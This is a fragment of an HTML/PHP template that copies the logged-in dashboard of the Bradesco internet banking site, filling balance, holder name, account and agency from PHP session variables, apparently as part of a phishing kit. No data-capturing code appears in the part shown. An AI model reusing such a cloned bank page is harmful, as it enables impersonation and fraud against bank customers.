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" data-name="Camada 1" height="1201" id="Camada_1" width="1201" x="200" y="200"></image>
                                        </svg>
                                        <p _ngcontent-xfy-c6=""><span class="moeda"><small class="saldo">R$ <span class="moedatela"><?php print $_SESSION['saldo']; ?></span></small><small></small></span></p>
                                    </span>
                                    <!---->
                                </div>
                                <span _ngcontent-xfy-c6="" class="separator"></span>
                                <div _ngcontent-xfy-c6="" class="dados-conta">
                                    <p _ngcontent-xfy-c6="" style="text-transform: uppercase;" class="nome"><?php print $_SESSION['titular_nome']; ?></p>
                                    <p _ngcontent-xfy-c6=""><?php print $_SESSION['conta']; ?> • <?php print $_SESSION['agencia']; ?></p>
                                </div>
                            </div>
                        </brad-dados-cliente>
                        <!---->
                        <brad-sessao _nghost-xfy-c7="">
                            <div _ngcontent-xfy-c7="" class="sessao">
                                <div _ngcontent-xfy-c7="" class="label"><span _ngcontent-xfy-c7="" class="tempo">27</span><span _ngcontent-xfy-c7="">MIN</span></div>
                                <svg _ngcontent-xfy-c7="" class="clock" height="44" width="44">
                                    <circle _ngcontent-xfy-c7="" class="bkg" cx="22" cy="22" r="20"></circle>
                                    <circle _ngcontent-xfy-c7="" cx="22" cy="22" fill="transparent" r="20"></circle>
                                    <circle _ngcontent-xfy-c7="" class="remaining" cx="22" cy="22" fill="transparent" r="20" stroke-dasharray="125.66" stroke-dashoffset="-5.541747191011236"></circle>
                                </svg>
                            </div>
                        </brad-sessao>
                        <!---->
                        <div class="logout">
                            <button tabindex="11" title="Sair" type="button">
                                Sair
                                <i class="ico">
                                    <svg height="18px" version="1.1" viewBox="0 0 18 18" width="18px" xmlns="http://www.w3.org/2000/svg">
                                        <path d="M13.2918932,9 L5.5,9 C5.22385763,9 5,8.77614237 5,8.5 C5,8.22385763 5.22385763,8 5.5,8 L13.2918932,8 L11.1454466,5.85355339 C10.9501845,5.65829124 10.9501845,5.34170876 11.1454466,5.14644661 C11.3407088,4.95118446 11.6572912,4.95118446 11.8525534,5.14644661 L14.8525534,8.14644661 C15.0478155,8.34170876 15.0478155,8.65829124 14.8525534,8.85355339 L11.8525534,11.8535534 C11.6572912,12.0488155 11.3407088,12.0488155 11.1454466,11.8535534 C10.9501845,11.6582912 10.9501845,11.3417088 11.1454466,11.1464466 L13.2918932,9 Z M13.999,14.5 C13.999,14.2238576 14.2228576,14 14.499,14 C14.7751424,14 14.999,14.2238576 14.999,14.5 L14.999,15.833 C14.999,16.4779131 14.4763721,17 13.832,17 L5.167,17 C3.417174,17 2,15.5824589 2,13.833 L2,1.167 C2,0.522086868 2.52262789,0 3.167,0 L12.499,0 C13.8791424,0 14.999,1.11985763 14.999,2.5 C14.999,2.77614237 14.7751424,3 14.499,3 C14.2228576,3 13.999,2.77614237 13.999,2.5 C13.999,1.67214237 13.3268576,1 12.499,1 L3.167,1 C3.07468092,1 3,1.07460361 3,1.167 L3,13.833 C3,15.0302321 3.96951675,16 5.167,16 L13.832,16 C13.9243191,16 13.999,15.9253964 13.999,15.833 L13.999,14.5 Z" fill="#ffffff" id="path-1"></path>
                                    </svg>
                                </i>
                            </button>
                        </div>
                    </div>
                </header>
                <!---->
            </div>




        </brad-header>
        <!---->
        <brad-menu _ngcontent-xfy-c0="" _nghost-xfy-c2="">
            <div _ngcontent-xfy-c2="" class="top-menu">
                <nav _ngcontent-xfy-c2="" id="nav">
                    <!----><!---->
                    <ul _ngcontent-xfy-c2="">
                        <li _ngcontent-xfy-c2=""><button _ngcontent-xfy-c2="" class="menu-item active" routerlinkactive="active" tabindex="2" title="Início" type="button">Início</button></li>
                        <!---->
                        <li _ngcontent-xfy-c2="">
                            <brad-menu-item _ngcontent-xfy-c2="">
                                <!----><button class="menu-item" routerlinkactive="active" type="button" tabindex="4" title="Saldos e Extratos" id=""> Saldos e Extratos
                                </button><!----><!---->
                            </brad-menu-item>
                        </li>
                        <li _ngcontent-xfy-c2="">
                            <brad-menu-item _ngcontent-xfy-c2="">
                                <!----><button class="menu-item" routerlinkactive="active" type="button" tabindex="5" title="Pagamentos" id=""> Pagamentos
                                </button><!----><!---->
                            </brad-menu-item>
                        </li>
                        <li _ngcontent-xfy-c2="">
                            <brad-menu-item _ngcontent-xfy-c2="">
                                <!----><button class="menu-item" routerlinkactive="active" type="button" tabindex="6" title="Transferências" id=""> Transferências
                                </button><!----><!---->
                            </brad-menu-item>
                        </li>
                        <li _ngcontent-xfy-c2="">
                            <brad-menu-item _ngcontent-xfy-c2="">
                                <!----><button class="menu-item" routerlinkactive="active" type="button" tabindex="7" title="Cartões" id=""> Cartões
                                </button><!----><!---->
                            </brad-menu-item>
                        </li>
                        <li _ngcontent-xfy-c2="">
                            <brad-menu-item _ngcontent-xfy-c2="">
                                <!----><button class="menu-item" routerlinkactive="active" type="button" tabindex="8" title="Empréstimos" id=""> Empréstimos
                                </button><!----><!---->
                            </brad-menu-item>
                        </li>
                        <li _ngcontent-xfy-c2="">
                            <brad-menu-item _ngcontent-xfy-c2="">
                                <!----><!----><a class="menu-item" id="topmenu_R" target="_blank" tabindex="9" title="Ágora Home Broker - Abre em nova janela"> Ágora Home Broker
                                </a><!---->
                            </brad-menu-item>
                        </li>
                        <li _ngcontent-xfy-c2="">
                            <brad-menu-item _ngcontent-xfy-c2="">
                                <!----><button class="menu-item" routerlinkactive="active" type="button" tabindex="10" title="Investimentos" id=""> Investimentos
                                </button><!----><!---->
                            </brad-menu-item>
                        </li>
                        <!---->
                        <li _ngcontent-xfy-c2="" class="dropdown">
                            <a _ngcontent-xfy-c2="" class="menu-item" href="javascript:;">
                                Mais opções
                                <svg _ngcontent-xfy-c2="" xmlns:xlink="http://www.w3.org/1999/xlink" class="arrow" height="20" viewBox="-5 -2 22 22" width="25" xmlns="http://www.w3.org/2000/svg">
                                    <path _ngcontent-xfy-c2="" d="M5.5 12.747l7.626-8.58a.5.5 0 1 1 .748.665l-8 9a.5.5 0 0 1-.748 0l-8-9a.5.5 0 1 1 .748-.664l7.626 8.58z" fill="#3b69ff" id="a"></path>
                                </svg>
                            </a>
                            <ul _ngcontent-xfy-c2="">
                                <!---->
                                <li _ngcontent-xfy-c2="">
                                    <brad-menu-item _ngcontent-xfy-c2="">
                                        <!----><button class="menu-item" routerlinkactive="active" type="button" tabindex="14" title="Câmbio" id=""> Câmbio
                                        </button><!----><!---->
                                    </brad-menu-item>
                                </li>
                                <li _ngcontent-xfy-c2="">
                                    <brad-menu-item _ngcontent-xfy-c2="">
                                        <!----><button class="menu-item" routerlinkactive="active" type="button" tabindex="15" title="Capitalização" id=""> Capitalização
                                        </button><!----><!---->
                                    </brad-menu-item>
                                </li>
                                <li _ngcontent-xfy-c2="">
                                    <brad-menu-item _ngcontent-xfy-c2="">
                                        <!----><button class="menu-item" routerlinkactive="active" type="button" tabindex="16" title="Celulares" id=""> Celulares
                                        </button><!----><!---->
                                    </brad-menu-item>
                                </li>
                                <li _ngcontent-xfy-c2="">
                                    <brad-menu-item _ngcontent-xfy-c2="">
                                        <!----><button class="menu-item" routerlinkactive="active" type="button" tabindex="17" title="Consórcios" id=""> Consórcios
                                        </button><!----><!---->
                                    </brad-menu-item>
                                </li>
                                <li _ngcontent-xfy-c2="">
                                    <brad-menu-item _ngcontent-xfy-c2="">
                                        <!----><button class="menu-item" routerlinkactive="active" type="button" tabindex="18" title="Outros Serviços" id=""> Outros Serviços
                                        </button><!----><!---->
                                    </brad-menu-item>
                                </li>
                                <li _ngcontent-xfy-c2="">
                                    <brad-menu-item _ngcontent-xfy-c2="">
                                        <!----><button class="menu-item" routerlinkactive="active" type="button" tabindex="19" title="Personalização e Segurança" id=""> Personalização e Segurança
                                        </button><!----><!---->
                                    </brad-menu-item>
                                </li>
                                <li _ngcontent-xfy-c2="">
                                    <brad-menu-item _ngcontent-xfy-c2="">
                                        <!----><button class="menu-item" routerlinkactive="active" type="button" tabindex="20" title="Previdência" id="topmenu_V"> Previdência
                                        </button><!----><!---->
                                    </brad-menu-item>
                                </li>
                                <li _ngcontent-xfy-c2="">
                                    <brad-menu-item _ngcontent-xfy-c2="">
                                        <!----><button class="menu-item" routerlinkactive="active" type="button" tabindex="21" title="Seguros" id=""> Seguros
                                        </button><!----><!---->
                                    </brad-menu-item>
                                </li>
                                <!----><!---->
                                <hr _ngcontent-xfy-c2="">
                                <!---->
                                <li _ngcontent-xfy-c2="">
                                    <brad-menu-item _ngcontent-xfy-c2="">
                                        <!----><button class="menu-item" routerlinkactive="active" type="button" tabindex="11" title="2ª Via comprovantes" id=""> 2ª Via comprovantes
                                        </button><!----><!---->
                                    </brad-menu-item>
                                </li>
                                <li _ngcontent-xfy-c2="">
                                    <brad-menu-item _ngcontent-xfy-c2="">
                                        <!----><button class="menu-item" routerlinkactive="active" type="button" tabindex="12" title="Agendamentos" id=""> Agendamentos
                                        </button><!----><!---->
                                    </brad-menu-item>
                                </li>
                                <!---->
                            </ul>
                        </li>
                    </ul>
                    <!---->
                </nav>
            </div>
        </brad-menu>
        <!---->
        <div _ngcontent-xfy-c0="" class="center">
            <div _ngcontent-xfy-c0="" id="app-wrapper">
                <brad-app-home style="display: inline-block; width: 100%;" ng-version="7.2.16">

                    <brad-onboarding>
                        <info-box _nghost-tfo-c12="" style="display: none;">
                            <div _ngcontent-tfo-c12="" id="infobox-onboarding" style="width: 413px; transform: matrix(1, 0, 0, 1, 1074, 196); position: fixed;">
                                <a _ngcontent-tfo-c12="" class="bt-close-onboarding scaled" href="javascript:;">
                                    <svg _ngcontent-tfo-c12="" height="18.414" viewBox="0 0 18.414 18.414" width="18.414" xmlns="http://www.w3.org/2000/svg">
                                        <g _ngcontent-tfo-c12="" data-name="Group 6406" id="Group_6406" transform="translate(-735.793 -118.793)">
                                            <line _ngcontent-tfo-c12="" data-name="Line 70" fill="none" id="Line_70" stroke="#fff" stroke-linecap="round" stroke-width="1" transform="translate(736.5 119.5)" x2="17" y2="17"></line>
                                            <line _ngcontent-tfo-c12="" data-name="Line 71" fill="none" id="Line_71" stroke="#fff" stroke-linecap="round" stroke-width="1" transform="translate(736.5 119.5)" x2="17" y1="17"></line>
                                        </g>
                                    </svg>
                                </a>
                                <div _ngcontent-tfo-c12="" id="rect-bia-onboarding">
                                    <p _ngcontent-tfo-c12="" id="infobox-text" tabindex="0" style="width: 305px; left: 54px; top: 78px; opacity: 0;">Tenha uma nova experiência com o Internet Banking...</p>
                                    <svg id="SvgjsSvg1001" width="413" height="124" xmlns="http://www.w3.org/2000/svg" version="1.1" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:svgjs="http://svgjs.com/svgjs">
                                        <defs id="SvgjsDefs1002"></defs>
                                        <path id="SvgjsPath1008" d="M0 0 L0 0 Q0 0 0 0 L0 0 Q0 0 0 0 L0 0 Q0 0 0 0 L0 0 Q0 0 0 0 Z" fill="#ffffff" stroke-opacity="1" stroke-width="0" stroke="#ffffff"></path>
                                    </svg>
                                </div>
                                <div _ngcontent-tfo-c12="" class="container-buttons">
                                    <a _ngcontent-tfo-c12="" class="button-padrao btn-vazio-white scaled" href="javascript:;">
                                        <p _ngcontent-tfo-c12="">Voltar</p>
                                    </a>
                                    <a _ngcontent-tfo-c12="" class="button-padrao btn-blue scaled" href="javascript:;">
                                        <p _ngcontent-tfo-c12="" id="bt_next_label_onboarding">Começar</p>
                                    </a>
                                </div>
                            </div>
                        </info-box>
                        <h-svg _nghost-tfo-c13="">
                            <svg _ngcontent-tfo-c13="" id="hl-svg" xmlns="http://www.w3.org/2000/svg" width="2560" height="937" style="display: none; opacity: 1;">
                                <defs _ngcontent-tfo-c13="">
                                    <linearGradient _ngcontent-tfo-c13="" gradientUnits="objectBoundingBox" id="linear-gradient" x2="1" y1="0.216" y2="0.219">
                                        <stop _ngcontent-tfo-c13="" offset="0" stop-color="#e1173f"></stop>
                                        <stop _ngcontent-tfo-c13="" offset="0.507" stop-color="#d81951"></stop>
                                        <stop _ngcontent-tfo-c13="" offset="1" stop-color="#8322a5"></stop>
                                    </linearGradient>
                                    <linearGradient _ngcontent-tfo-c13="" gradientUnits="objectBoundingBox" id="linear-gradient-exclusive" x1="0.01" x2="1" y1="0.185" y2="0.189">
                                        <stop _ngcontent-tfo-c13="" offset="0" stop-color="#653175"></stop>
                                        <stop _ngcontent-tfo-c13="" offset="0.522" stop-color="#6a3072"></stop>
                                        <stop _ngcontent-tfo-c13="" offset="1" stop-color="#b7233d"></stop>
                                    </linearGradient>
                                    <linearGradient _ngcontent-tfo-c13="" gradientUnits="objectBoundingBox" id="linear-gradient-private" x2="1" y1="0.197" y2="0.194">
                                        <stop _ngcontent-tfo-c13="" offset="0" stop-color="#385f79"></stop>
                                        <stop _ngcontent-tfo-c13="" offset="1" stop-color="#04273e"></stop>
                                    </linearGradient>
                                    <linearGradient _ngcontent-tfo-c13="" gradientUnits="objectBoundingBox" id="linear-gradient-click" x2="1" y1="0.197" y2="0.194">
                                        <stop _ngcontent-tfo-c13="" offset="0" stop-color="#f36279"></stop>
                                        <stop _ngcontent-tfo-c13="" offset="0.523" stop-color="#cf1035"></stop>
                                        <stop _ngcontent-tfo-c13="" offset="1" stop-color="#b41580"></stop>
                                    </linearGradient>
                                    <linearGradient _ngcontent-tfo-c13="" gradientUnits="objectBoundingBox" id="linear-gradient-universitario" x2="1" y1="0.556" y2="0.548">
                                        <stop _ngcontent-tfo-c13="" offset="0" stop-color="#1d428a"></stop>
                                        <stop _ngcontent-tfo-c13="" offset="1" stop-color="#c5092f"></stop>
                                    </linearGradient>
                                </defs>
                                <mask _ngcontent-tfo-c13="" id="aMask">
                                    <rect _ngcontent-tfo-c13="" fill="white" id="hl-white-mask" x="0" y="0" width="2560" height="937"></rect>
                                    <rect _ngcontent-tfo-c13="" class="rect-target" id="rect-target0" style="fill: black; stroke: black; stroke-width: 1; transform-origin: 0px 0px 0px;" x="0" y="0" rx="0" ry="0" width="100" height="100" data-svg-origin="0 0" transform="matrix(30.72,0,0,11.24399,0,0)"></rect>
                                    <rect _ngcontent-tfo-c13="" class="rect-target" id="rect-target1" style="fill: black; stroke: black; stroke-width: 1;" x="0" y="0" rx="1" ry="1" width="100" height="100" data-svg-origin="0 0" transform="matrix(0.001,0,0,0.001,0,0)"></rect>
                                    <rect _ngcontent-tfo-c13="" class="rect-target" id="rect-target2" style="fill: black; stroke: black; stroke-width: 1;" x="0" y="0" rx="0" ry="0" width="100" height="100" data-svg-origin="0 0" transform="matrix(0.001,0,0,0.001,0,0)"></rect>
                                </mask>
                                <rect _ngcontent-tfo-c13="" id="hl-main-bg" mask="url(#aMask)" style="fill:/*savepage-url=#linear-gradient*/url();opacity: 0.85;" x="0" y="0" width="2560" height="937"></rect>
                            </svg>
                            <div _ngcontent-tfo-c13="" id="bg-t" style="display: none;"></div>
                        </h-svg>
                    </brad-onboarding>
                    <!----><!----><!----><!---->
                    <div class="container">
                        <div class="grid">
                            <div class="cell large-12 grid">
                                <div class="cell large-9 alerts">
                                    <!---->
                                </div>
                                <div class="cell large-3 text-right">
                                    <div class="toggle-switch"><span class="label active">Ocultar valores</span><label class="switch"><input tabindex="0" type="checkbox" title="Mostrar Valores" checked=""><span class="slider round"></span></label></div>
                                </div>
                            </div>
                        </div>
                    </div>
